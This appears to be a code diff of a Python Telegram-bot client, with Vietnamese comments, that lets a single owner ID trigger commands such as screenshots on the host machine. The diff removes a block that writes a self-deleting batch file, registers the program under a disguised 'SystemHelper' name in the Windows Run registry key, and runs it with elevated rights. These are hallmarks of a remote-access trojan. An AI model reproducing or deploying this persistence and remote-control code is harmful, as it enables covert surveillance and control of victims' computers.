@@ -82,14 +82,16 @@ def ask_permission_and_send(chat_id, filepath):
 
     threading.Thread(target=gui_thread).start()
 
-# === Xử lý lệnh từ Telegram ===
+
+# === Handler khi nhận lệnh /start ===
 @bot.message_handler(commands=["start"])
 def send_online(message):
     if message.chat.id == OWNER_ID:
         bot.send_message(message.chat.id, f"✅ Máy đang online! ID: {CLIENT_ID}")
 
-# ___________________________________ SCREENSHOT  ______________
+ 
 
+#__________________________________ SCREENSHOT  ______________
 
 @bot.message_handler(commands=["screenshot"])
 def handle_screenshot(message):
@@ -546,27 +548,12 @@ import tempfile
 import subprocess
 import time
 
+
+
+
+
+
+
 if __name__ == "__main__":
-    print(f"Client started with ID: {CLIENT_ID}")
     bot.polling()
-    # Đợi 10 giây trước khi thực hiện
-    time.sleep(10)
-
-    # Đường dẫn exe của bạn
-    exe_path = os.path.abspath(sys.executable)
-
-    # Nội dung .bat
-    bat_content = f"""@echo off
-    REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /V "SystemHelper" /t REG_SZ /F /D "{exe_path}"
-    del "%~f0"
-    """
-
-    # Tạo file .bat tạm
-    bat_file = os.path.join(tempfile.gettempdir(), "temp_startup.bat")
-    with open(bat_file, "w") as f:
-        f.write(bat_content)
-
-    # Chạy .bat với quyền admin
-    subprocess.run(['powershell', 'Start-Process', bat_file, '-Verb', 'RunAs'])
-
 
